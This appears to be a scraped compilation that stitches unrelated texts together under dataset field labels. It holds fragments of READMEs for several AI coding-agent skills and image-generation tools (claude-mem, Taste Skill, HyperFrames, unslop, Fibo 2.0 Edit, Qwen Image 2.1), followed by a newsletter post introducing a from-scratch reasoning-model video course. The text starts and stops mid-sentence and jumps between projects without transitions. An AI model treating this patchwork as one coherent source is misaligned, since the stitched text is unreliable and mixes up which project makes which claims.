⚙️ **Context Configuration** - Fine-grained control over what context gets injected - 🤖 **Automatic Operation** - No manual intervention required - 🔗 **Citations** - Reference past observations with IDs through the worker API or view all in the web viewer --- ## Documentation 📚 **[View Full Documentation](https://docs.claude-mem.ai/)** - Browse on official website ### Getting Started - **[Installation Guide](https://docs.claude-mem.ai/installation)** - Quick start & advanced installation - **[Usage Guide](https://docs.claude-mem.ai/usage/getting-started)** - How Claude-Mem works automatically - **[Search Tools](https://docs.claude-mem.ai/usage/search-tools)** - Query your project history with natural language - **[Cloud Sync](https://docs.claude-mem.ai/cloud-sync)** - Back up your memories to cmem.ai — no daemon, the worker syncs on write ### Best Practices

extra.source_text:
Agent skills that give coding agents taste: art direction, reference images and a browser check instead of generic AI pages

     

Sponsors

interfaces.dev · A design engineering magazine by Jakub Krehel
React Bits · animated React components for creative interfaces
IMG.LY · CreativeEditor SDK
Sent.dm · messaging APIs for SMS, WhatsApp, and RCS

Become a sponsor

**Taste Skill** is an Agent Skill that makes coding agents design websites and app screens instead of assembling the average landing page. It gives the agent an art direction, real pictures and a way to check its own work in a real browser. Pages it has built, each from one brief:
The photographs are real, found in open archives and credited by the skill ([credits](examples/v2/CREDITS.md)). Watch the [launch film](https://github.com/Leonxlnx/taste-skill/releases/tag/v2.0.0). ## Install ```bash npx skills add https://github.com/Leonxlnx/taste-skill --skill "design-taste-frontend" ``` That installs the skill with the [`npx skills`](https://github.com/vercel-labs/agent-skills) CLI. The skill runs its scripts with **Node 22+** and an installed **Chrome, Edge or Chromium**. It installs nothing and needs no API keys. Finding pictures needs network access.
Claude Code plugin Run these inside Claude Code. The skill is namespaced under `taste-skill:`, so it does not collide with your other skills. ``` /plugin marketplace add Leonxlnx/taste-skill /plugin install taste-skill@taste-skill ``` `/plugin update` upgrades it later.
Codex plugin ```bash codex plugin marketplace add Leonxlnx/taste-skill codex plugin add taste-skill@taste-skill ``` Start a new Codex session afterwards so the skill is loaded.
From a clone, linked instead of copied `./install.sh` symlinks the skill into Claude Code (`--codex` for Codex, `--all-agents` for both), so a `git pull` updates it in place.
Already have the skill? Run the install command again; the install name did not change. Looking for one of the older skills? See [Moved skills](#moved-skills). ## How v2 works The skill is built from a study of 247 curated sites. A build runs in six steps: 1. Reads the brief and lists what only this client has. 2. A script deals three of 20 researched directions and the agent picks one. 3. Finds the idea: one sentence tying the client's own material to that direction. 4. Builds with real pictures and footage from open collections, credited. 5. Checks the page in a real browser at three widths and fails it on slop. 6. Looks at its own screenshots and fixes the top three problems, up to three rounds. A build takes roughly 30 to 45 minutes and a few hundred thousand tokens. Details are in the [changelog](CHANGELOG.md) and the [study](skills/taste-skill/references/research.md). Dashboards and app screens (v2.1) take their own route: the skill deals one of the app styles distilled from real product screens, builds the shell, the data, the charts and the tables to those numbers, and checks the result with app rules: quiet panels, aligned figures, colour spent on data, a phone layout where the navigation folds away. A product's landing page builds the app it shows the same way, so its screenshots look like a working product. v2.1 also checks the frame of every page (a clear title on the first screen, equal margins, no section shoved to one side, no random blank stretches) and moves the way strong award sites do, measured on the latest 100 Awwwards Sites of the Day. ## Moved skills This repo holds one skill, `design-taste-frontend`. The others moved to repos of their own and kept their install names: | Install name | Where it lives now | | --- | --- | | `high-end-visual-design`, `minimalist-ui`, `industrial-brutalist-ui`, `gpt-taste`, `stitch-design-taste`, `design-taste-frontend-v1`, `design-taste-frontend-v2-experimental` | **[Leonxlnx/taste-skill-classics](https://github.com/Leonxlnx/taste-skill-classics)** | | `imagegen-frontend-web`, `imagegen-frontend-mobile`, `brandkit`, `image-to-code` | **[Leonxlnx/imagegen-skills](https://github.com/Leonxlnx/imagegen-skills)** | | `redesign-existing-projects` | Part of `design-taste-frontend`, which audits an existing page in a real browser before changing anything | | `full-output-enforcement` | Removed. For the same problem, see **[Leonxlnx/unlazy](https://github.com/Leonxlnx/unlazy)** | Install a moved skill from its new repo under the same name: ```bash npx skills add https://github.com/Leonxlnx/taste-skill-classics --skill "high-end-visual-design" ``` ## Common Questions **What does the skill need?** Node 22 or newer and Chrome, Edge or Chromium. It installs nothing and uses no API keys. It needs the internet only to find pictures. **Where do the pictures come from, and can I use them?** From open collections such as Wikimedia Commons, Openverse and the Met. Only public domain, CC0, CC BY and CC BY-SA files are offered, and the skill puts the credits on the page. Replace them with your own when you have them. **Does it work with React, Vue, Svelte, plain HTML?** Yes. The rules are about design, not a framework. **Is it for dashboards and app screens?** Yes, since v2.1. The skill tells a page from an app screen and builds a dashboard, an admin view or a settings screen with its own run: a style dealt from a study of real product screens, quiet panels, honest data and charts, and its own checks (`inspect.mjs --app`). ## Support the project If Taste Skill helps you, consider sponsoring: [Sponsor on GitHub](https://github.com/sponsors/Leonxlnx) ### Open Source Supporters

Get a Kimi API key: taste-skill users get 10% bonus API credits on their first purchase.

extra.source_text:
Write HTML. Render video. Built for agents.

Write HTML. Render video. Built for agents.

Studio | Quickstart | Showcase | Playground | Catalog | Docs | Discord

Download the desktop app: macOS · Windows · Linux (.deb)

HyperFrames is an open-source framework for turning HTML, CSS, media, and seekable animations into deterministic MP4 videos. Use it locally with the CLI, from AI coding agents with skills, or as the rendering core behind hosted authoring workflows. Using Claude Code, Codex, Cursor, or another coding agent? Run `npx hyperframes skills update` once, then ask your agent to make a video. ## Quick Start ### With an AI coding agent For Claude Code, install the versioned plugin: ```bash claude plugin marketplace add heygen-com/hyperframes claude plugin install hyperframes@hyperframes ``` To enable auto-update for the **hyperframes** marketplace, run `claude` in a terminal in your project. In Claude Code's terminal UI, run `/plugin`, then select **Marketplaces** → **hyperframes** → **Enable auto-update**. Afterward, use `/hyperframes:hyperframes`. See the [plugin guide](docs/guides/plugins.mdx) for Copilot, VS Code, Cursor, Gemini CLI, updates, and migration. For standalone skills (including OpenCode), use: ```bash npx skills add heygen-com/hyperframes ``` > The picker opens with nothing pre-selected — the **Core Skills** group is all you need; `/slideshow`, `/remotion-to-hyperframes` and `/figma` install on demand. Agents and non-interactive runs should use `npx hyperframes skills update` instead — it installs exactly the core set, whereas `skills add --all` installs all 7 published skills. The six repo-internal skills under `.claude/skills` / `.agents/skills` are excluded by default. For the full published set use `npx hyperframes skills`. > > `skills add` resolves the skills.sh registry blob, which can lag `main` by hours. `npx hyperframes skills update` installs from the current `main`, so reach for it when you need the newest copy of a skill. Run project-local installs from your video project's directory. From a HyperFrames checkout, use `npx hyperframes skills update` for a global install instead: a project-local installer target can overlap the tracked `skills/` source and overwrite uncommitted edits. See [contributor setup](CONTRIBUTING.md#getting-started). Try a prompt like: > Using `/hyperframes`, create a 10-second product intro with a fade-in title, a background video, and subtle background music. The skills teach agents the HyperFrames production loop: plan the video, write valid HTML, wire seekable animations, add media, lint, preview, and render. They work with Claude Code, Codex, Cursor, Gemini CLI, IBM Bob, and other coding agents that support skills. ## Skills HyperFrames ships 7 skills. Make any video by asking for it; the `/hyperframes` skill carries the contract and the references (film, captions, overlays, motion, look). Read it first. For standalone installation, default to the **core set** (`/hyperframes`, `/hyperframes-cli`, `/hyperframes-registry`, `/media-use`). `npx hyperframes skills update` installs exactly that from anywhere; the interactive picker (`npx skills add heygen-com/hyperframes`) lists it as the "Core Skills" group, nothing pre-selected. The picker is interactive-only — a non-interactive or agent run without `--skill` installs all 7. Use `npx skills add heygen-com/hyperframes --all` to install the complete published set deliberately (skips the picker), or `npx skills add heygen-com/hyperframes --skill ` for just one (bare name, no leading `/`). Standalone installs stay lean after that: `npx hyperframes init` installs the **core set** only when it is missing and never touches a skill you already have (`npx hyperframes skills update` refreshes them, and never removes one); `/figma`, `/slideshow` and `/remotion-to-hyperframes` install **on demand** with `npx hyperframes skills update `. Nothing re-pulls the full set behind your back. ### Plugin packages Plugins bundle the full skill catalog and use their agent's update manager. `bun run package:agent-plugin` builds the committed portable ZIP, source metadata, and SHA-256 checksum. See the [maintainer checklist](docs/contributing/agent-plugins.mdx). ### Upload to Codex Build the upload-ready Codex plugin archive from the committed `HEAD` version of the manifest, brand assets, and skills: ```bash bun run package:codex-plugin ``` This writes `dist/hyperframes-plugin.zip` with a `hyperframes/` root folder and fails if the archive exceeds Codex's 100 MB upload limit. ### Core set | Skill | Use when | | ----------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | | `/hyperframes` | **Read first** for any request to make, edit, animate or render a video, motion graphic, captions or overlays with HyperFrames (HTML rendered to video). Holds the render contract and the work loop, and points to the references for format, motion, look, captions, whole films and storyboards. | | `/hyperframes-cli` | The HyperFrames CLI by job — scaffold, check, look at frames, edit the timeline, preview, render locally or in the cloud, publish, project history — plus reading its JSON and recovering from build or render failures. | | `/hyperframes-registry` | About 450 ready-made blocks and components installed as editable source — transitions, overlays, titles, kinetic type, captions, charts, maps, 3D, camera moves. Use before hand-building any named visual; also for `hyperframes add` and `catalog`. | | `/media-use` | Get or make any media for a video — music, sound effects, images, icons, logos, voiceover, avatar and generated video, transcripts, cutouts, colour grades and looks — with HeyGen or free local tools, and mix placed audio. Also for footage that looks dark, flat or dull. | ### On demand | Skill | Use when | | -------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | | `/figma` | Bring Figma into a video — rendered assets, brand tokens, components, storyboard frames as reconstructed motion, shaders and connector-assisted motion. Use when you paste a figma.com link. | | `/slideshow` | A presentation, pitch deck or interactive deck — discrete slides, fragment reveals, branching, hotspot navigation, presenter mode with speaker notes. Output is a navigable deck, not a rendered MP4. | | `/remotion-to-hyperframes` | Bringing existing video code or footage into HyperFrames (Remotion first; also Motion Canvas, Lottie, Three.js, canvas, other tools' renders), verified frame by frame. | For visual design handoff workflows, see the [Claude Design guide](https://hyperframes.heygen.com/guides/claude-design) and [Open Design guide](https://hyperframes.heygen.com/guides/open-design). ### Manually with the CLI ```bash npx hyperframes init my-video cd my-video npx hyperframes preview # preview in browser with live reload npx hyperframes render # render to MP4 ``` **Requirements:** Node.js 22+, FFmpeg ## What You Can Build Need ideas? Browse the [Showcase](https://hyperframes.heygen.com/showcase) for finished videos you can watch, read, run, and remix. - Product launch videos and feature announcements - PR walkthroughs with animated code diffs, narration, and captions - Data visualizations, chart races, and map animations - Social videos with kinetic captions, overlays, and music - Docs-to-video, PDF-to-video, and site-tour explainers - Reusable motion graphics for automated content pipelines ## Frame.md **frame.md — your design system, ready for video.** Every brand has a `design.md`. None of them were written for a camera. `frame.md` is the missing translation layer: it takes your web-context design spec and inverts it for the frame — the same tokens, the same rules, but rewritten so an AI agent can compose a promo video without guessing at scale or reaching for web chrome. The output is a `DESIGN.md` superset your whole toolchain can read. Atoms stay sacred. Composition stays free. Numbers come from the script.

A Claude skill that turns vibecoded, AI-looking UI into a designed interface

# unslop

Created by Damir Sokolovsky ([@heydamir](https://x.com/heydamir)), who started the [Unslopping series](https://x.com/heydamir/status/2115063463063998736) on X.

![A vibecoded dashboard unslopping itself, frame by frame](skills/unslop/references/refs/story-dashboard-frames.webp)

unslop is a skill for Claude Code and Codex that turns vibecoded, AI-looking UI into a designed interface with its own character. It finds the slop first, the purple gradients, glows, emoji labels, shouty copy and uneven spacing, then sets a direction from your product and fixes the screen pass by pass like a designer doing a redline review. It works in whatever your screen is built with, like Next.js, React, Vue, Svelte, Tailwind or plain HTML and CSS, on dashboards, apps and landing pages, and even on a live site when all you have is a link.

## Install

For Claude Code, copy the skill into your skills folder.

```bash
git clone https://github.com/heydamir/unslop
mkdir -p ~/.claude/skills && cp -r unslop/skills/unslop ~/.claude/skills/
```

For a single project, copy it into `.claude/skills/` inside that project instead.

For Codex, ask it to install the skill straight from this repo.

```
$skill-installer install https://github.com/heydamir/unslop/tree/main/skills/unslop
```

Or copy it by hand into `~/.agents/skills/`, or into `.agents/skills/` inside a single project.

```bash
git clone https://github.com/heydamir/unslop
mkdir -p ~/.agents/skills && cp -r unslop/skills/unslop ~/.agents/skills/
```

To snapshot a live site or create a story video, install Playwright and its Chromium browser from the project directory where you run the skill:

```bash
npm install -D playwright
npx playwright install chromium
```

Story videos also require ffmpeg installed and available on your PATH.

## Use

In Claude Code, type `/unslop` with what you want. In Codex, type `$unslop` the same way. Or just ask in your own words and the agent picks the skill up by itself.

```
/unslop this dashboard
/unslop the hero of https://example.com
/unslop my landing page and make the story video so I can post it
```

It audits the screen and proposes a direction before it edits anything, so you can steer it early. If the screen is already good, it tells you so and suggests a few small refinements instead of redesigning it.

## What it does

- **Audit.** Lists every sign of slop with where it lives.
- **Direction.** Character, world, the one or two moments that carry the color, and a signature detail, all taken from your product.
- **Passes.** Spacing, color, icons, copy, type, layout, details, visuals and motion, in that order.
- **Visuals.** Shows your product instead of a glossy blob. When a hero needs a scene or an object, it can generate one through an image service like fal, Replicate, OpenAI images or Higgsfield. If none is connected, it offers to connect one as an MCP server, and it shows the prompt and asks before every paid generation. Dashboards and apps rarely need one.
- **Story video.** A square video under 10 seconds of your screen unslopping itself, ready to post. It needs Playwright and ffmpeg.

Try it on the two vibecoded screens in [examples](examples).

## Hire the unslopper

Would rather have a designer do it? Damir unslops one key screen in 3 days, built in your stack, at [heydamir.design/unslop](https://heydamir.design/unslop).

quick.summary: Type what you want changed and it edits the picture in 4 steps, with up to 4 reference images and an optional painted mask.

extra.source_text:
Fibo 2.0 Edit Turbo on ZeroGPU: instruction-based image editing in 4 guidance-free steps, with up to 4
reference images and an optional mask. The JSON instructions come from the Bria API's
`/v2/vgl/edit`, written with Fibo 2.0's VGL prompts.

Two surfaces:

- **`/` — Studio** (replaces the classic form UI): a bespoke Photoshop-style editor (`gr.Server`
  API + custom UI): brush-to-mask, layers (source / mask / up to 3 extra references), before/after
  split view, run history with one-click restore, bundled example edits. All classic functionality
  is kept: 4 references, mask, JSON instruction override (auto-filled by the VGL writer, cleared
  when inputs change), seed/steps. Edits call the same `render` as before, so the AOTI-accelerated
  pipeline in `pipelines.py` and the `/v2/vgl/edit` prompt writing behave identically.
- **`/workflow` — Workflow canvas** (`gr.Workflow`): node-based edit pipelines you can rewire
  and chain. Run nodes one at a time with ▶ — up-to-date upstream results are reused.
  Saving the graph back to the Space is off: it needs the `write-repos` OAuth scope, which
  would give the Space write access to every signed-in visitor's repos. To change the starter
  graph, edit `workflow.json` in the repo.

Space secrets: `HF_TOKEN` (read access to the gated model), `BRIA_API_TOKEN` (the Bria API).

# ⚡ Qwen Image 2.1 Realtime

Real-time text-to-image and multi-image editing with
[`Qwen/Qwen-Image-2.1`](https://huggingface.co/Qwen/Qwen-Image-2.1), accelerated by our 2-step
[DMD2-distilled LoRA](https://huggingface.co/linoyts/Qwen-Image-2.1-DMD2-2steps) (fused into the
weights) and AOTInductor kernels, running on ZeroGPU through `QwenImage21Pipeline`.

* **⚡ Realtime**: holds the GPU for ~90s and streams a 512px result that updates live as you
  change the prompt, skipping the per-call GPU reservation.
* **Full quality**: leave Realtime off and use Generate for 1024/1536 output.
* **Editing**: upload up to 10 images and refer to them as `<image1>` … `<image10>`.
* **Transparency**: the model natively decodes RGBA. Ask for it in the prompt.

Sampling uses the LoRA's trained 2-step schedule (fixed sigmas `[1.0, 0.5]`, CFG 1).

extra.candidate_title: Sebastian Raschka's from-scratch video course on building reasoning models
extra.source_text: Building Reasoning Models from the Ground Up: A Full Video Course Eight videos and over 11 hours of coding, covering evaluation, inference-time scaling, reinforcement learning, and distillation in Python and PyTorch. Sebastian Raschka, PhD Oct 24, 2026 390 15 40 Share I have written a lot about reasoning models here over the last two years on Ahead of AI, including a recent article on mechanisms to control reasoning effort levels in contemporary LLMs . Reasoning models are still as relevant as ever. In fact, almost all current-generation LLMs today are reasoning models or offer a reasoning mode. For those who are interested in how reasoning models work, including inference scaling, reinforcement learning, and distillation, I wrote my recent Build Reasoning Model (From Scratch), which implements these from the ground up in PyTorch, which, in my experience, is still the best way to understand and learn how things really work. Now, in the last few months, I also sat down and recorded accompanying lectures I wanted to share with you. So, below, you will find eight reasoning model-from-scratch coding videos (11 hours of content). We start with a pre-trained LLM and implement methods to evaluate and improve it in Python and PyTorch. So, if you enjoyed my Coding LLMs from the Ground Up course last year, this is essentially the sequel (but you can also watch it without the prior course as a prerequisite). I’m currently taking a short break and will be back soon with more exciting LLM research roundups next month. In the meantime, I hope you enjoy coding along! How LLMs, reasoning models, and agents relate and fit together As a small side note, and since I often get asked how reasoning models relate to today’s AI agents, here’s a short section on this before getting started with the videos. A reasoning model is essentially an upgrade from a conventional LLM, that is, adding more post-training via reinforcement learning with verifiable rewards (and optionally inference scaling techniques) to make it more capable of solving more challenging problems. Classically, reasoning models are developed for math and code, but the capabilities can generalize to other problem domains as well. A reasoning model then functions as the engine inside an agent harness, where the agent harness is a software or tooling framework around the LLM/reasoning model to tackle even more challenging problems (bigger coding tasks, travel booking, and all other sorts of personal assistant tasks). The task of the harness is sophisticated context management and giving the LLM access to tools. Figure 1: An engine analogy for conventional LLMs, reasoning models, and agent harnesses. Figure from my Components of a Coding Agent article. In this analogy depicted in the figure above, the model is the engine, and the agent harness adds the machinery that lets us use it for various things (as an upgrade from a simple chatbot interface). An agent can use either a conventional LLM or a reasoning model, but reasoning models are the more typical choice as they are more capable. (As mentioned above, most current-gen LLMs are reasoning models with variable reasoning effort settings.) So, the bottom line is that reasoning models, as the “engine,” remain an important part of understanding modern LLM agents. The resources accompanying these topics shown above are: The Build a Large Language Model (From Scratch) book and videos The Build A Reasoning Model (From Scratch) book (and videos below) The Components of a Coding Agent article on Substack The videos below focus on developing the reasoning model that can power such a system. Scope and prerequisites The reasoning-from-scratch videos focus on a small pre-trained Qwen3 model, where we implement the reasoning methods ourselves in Python and PyTorch. Starting with a pre-trained model lets us focus on the interesting part: evaluation, inference-time scaling, reinforcement learning, and distillation. Regarding the prerequisites, I recommend being comfortable with Python and PyTorch. I designed the reasoning materials as standalone content, so the previous Build A Large Language Model (From Scratch) content is recommended but not strictly required. Compute-resource-wise, you can work through the early text-generation and evaluation examples on a CPU. For the later experiments, especially training, a GPU makes the work much more practical. The first video covers the setup and some more recommendations; the repository also includes hardware and environment recommendations . Figure 2: An overview of the topics being covered. The companion book These videos accompany my book, Build a Reasoning Model (From Scratch) . If you like to read through the explanation in more detail and at your own pace, work through exercises, and so on, I recommend the book as a companion here. For the most in-depth learning experience, my suggestion is to read a chapter, work through its code alongside the corresponding video, and then try the exercises. The book is available from Manning and Amazon , and the print edition is in color! Figure 3: A random excerpt from the Build a Reasoning Model (From Scratch) print book. Thank you to everyone who has picked up a copy or recommended it to a friend. Your support helps me keep creating these materials. The videos As a last, quick side note before getting to the main videos below: For a shorter, more conceptual overview, I also recommend my AI Reasoning Models course on LinkedIn Learning (it should be free for 24h when accessing it via the link there, which shouldn’t then require a LinkedIn Premium subscription). The course is about 90 minutes and explains how reasoning models work, covering the main ideas behind inference-time scaling, reinforcement learning, and distillation. It’s a good optional preview if you’d like the main ideas without working through the full implementations below. To get to the main part of this article, here are the eight main lecture videos. 1. Motivation and code setup The first video starts with an explanation of the relationship between conventional LLMs, reasoning models, and agents. Next, the main topic of the video is setting up the coding environment. This includes installing the Python and PyTorch dependencies (with uv), among others. I also discuss hardware choices and common setup issues. Topics covered The relationship between conventional LLMs, reasoning models, and agent harnesses On the benefits of learning through code implementations The scope of this video series Installing Python dependencies Choosing hardware and checking CUDA or Apple Silicon support Using a remote GPU with VS Code and troubleshooting the environment Watch video 1 · Setup instructions 2. Loading a base model, text generation, and KV caching Before adding reasoning methods in the upcoming videos, we need a working base model. Instead of training it from scratch, since that would be a whole other book (see Build A Large Language Model (From Scratch) ), we start with a pre-trained model. Here, we load the pre-trained weights of a Qwen3 0.6B model. Then, we implement the text-generation process via a streaming text generator and add KV caching and model compilation to make text generation more efficient. These implementations give us the baseline and base components we will evaluate and improve in the following videos. Topics covered Encoding text as tokens and decoding it back into text Downloading Qwen3 weights and loading the model on the selected compute device Going over tensor shapes, logits, and next-token predictions Implementing greedy decoding and streaming text generation Handling end-of-sequence tokens and measuring generation speed Adding a KV cache to reuse attention keys and values Combining KV caching with torch.compile and comparing hardware performance Watch video 2 · Chapter 2 code 3. Building a verifier for evaluation and reinforcement learning In this lecture, we build a math-answer verifier step by step, from answer extraction to normalization and checking mathematical equivalence. We then use it to evaluate the model on MATH-500. We use this verifier to evaluate the base model’s performance on the MATH-500 evaluation dataset. However, the verifier also has a second job later in the series: providing the reward signal for reinforcement learning with verifiable rewards (RLVR). Topics covered Intro to verifiers and how they fit into LLM evaluation methods (other methods are covered in the book’s appendix) Reusing answer verification as a reward signal for RLVR (more on that in chapter 6) The verifier flow, including extracting final answers, normalizing answers and checking mathematical equivalence Building an answer grader and an evaluation loop for MATH-500 Comparing base and reasoning models on MATH-500 Watch video 3 · Chapter 3 code 4. Inference-time scaling: sampling and self-consistency Now we explore ways to improve answers while keeping the model weights fixed. But before implementing specific inference-scaling techniques, we first implement methods to generate diverse answers from the same prompt (this is standard practice in proprietary LLM chatbots, such as ChatGPT). Concretely, we implement temperature scaling, multinomial sampling, and top-p filtering to generate diverse responses. Then we combine multiple responses through self-consistency, using majority voting over their final answers. We also examine the tradeoff between answer accuracy and the extra computation needed to generate more candidates. Topics covered Comparing how additional compute benefits model performance during training and during inference A gentle intro to inference-scaling through chain-of-thought prompts Implementing temperature scaling and multinomial sampling to generate diverse answers Adding top-p filtering to control the quality of the diverse answers Combining candidate answers through self-consistency, one of the most popular inference scaling techniques Evaluating MATH-500 accuracy against the cost of additional inference compute Watch video 4 · Chapter 4 code 5. Inference-time scaling: scoring and self-refinement Building on the previous video, we implement scoring functions to compare multiple answers generated from the same prompt. We can also use these scoring methods to break ties in self-consistency (covered in the previous lecture). The scoring methods covered here include computing token and sequence log probabilities (this will also be relevant in the later reinforcement learning chapters). We then implement a self-refinement loop in which the model critiques an answer and attempts a revision. The evaluation lets us check how useful those additional steps are for our model. Topics covered Using scoring functions for comparing multiple answers and breaking ties Implementing a simple heuristic scorer Computing token probabilities and sequence likelihoods (also relevant for the following lectures) Using log probabilities for improved numerical stability Building a self-refinement loop for generating critiques and revised answers Evaluating self-refinement on MATH-500 Watch video 5 · Chapter 5 code 6. Reinforcement learning: implementing GRPO for RLVR In this lecture, we move on to implementing a training technique called Reinforcement Learning with Verifiable Rewards (RLVR). We first implement a simplified version of Group Relative Policy Optimization (GRPO), generate groups of responses, score them with our verifier, and use their relative rewards for the model weight updates during training.
